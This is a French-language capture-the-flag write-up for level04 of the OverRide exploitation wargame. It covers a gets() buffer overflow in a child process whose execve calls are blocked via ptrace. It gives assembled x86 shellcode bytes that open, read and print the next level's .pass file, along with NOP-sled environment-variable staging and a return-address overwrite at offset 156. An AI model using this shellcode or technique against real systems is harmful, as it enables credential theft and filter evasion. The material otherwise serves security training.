# Level 04

Dans ce niveau le programme cree un processus fils executant un buffer overflow (`gets`) le processus parent surveille les syscalls du fils via `ptrace` si le syscall execve (`0xb` (`11`)) est detecte le processus enfant est tue 

L’objectif est donc d’executer du code sans appeler execve directement

Pour cela on va devoir faire notre propre [shellcode](artifacts/shellcode.s) qui va `ouvrir` `lire` `ecrire` le fichier `.pass`

```bash
➜ nasm -f elf32 shellcode.s -o shellcode.o                       
➜ ld -m elf_i386 shellcode.o -o shellcode                         
➜ objcopy -O binary --only-section=.text shellcode.o shellcode.bin
➜ xxd -p shellcode.bin | tr -d '\n' | sed 's/../\\x&/g'           
\xeb\x31\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x05\x5b\xcd\x80\x89\xc6\x89\xd9\x31\xc0\x89\xf3\xb0\x03\x83\xec\x29\x8d\x0c\x24\xb2\x29\xcd\x80\x31\xdb\xb0\x04\xb3\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xca\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73
```

Manque plus qu'a le mettre dans une variable d'environnement
```bash
level04@OverRide:/tmp$ export SHELLCODE=$(python -c 'print "\x90" * 100 + "\xeb\x31\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x05\x5b\xcd\x80\x89\xc6\x89\xd9\x31\xc0\x89\xf3\xb0\x03\x83\xec\x29\x8d\x0c\x24\xb2\x29\xcd\x80\x31\xdb\xb0\x04\xb3\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xca\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73"')
```

Apres avoir utiliser [getenv](artifacts/getenv.c) pour trouver l'adresse de la variable et avoir fait un decalage de `10` pour s'assurer d'atterrir dans le `NOP Sled` et en ecrasant l'adresse de retour se trouvant a l'offset `156` on peut voir l'execution de notre shellcode

```bash
level04@OverRide:~$ (python -c 'print "A" * 156 + "\xff\xff\xd8\x69"[::-1]') | ./level04 
Give me some shellcode, k
***********************************
child is exiting...
```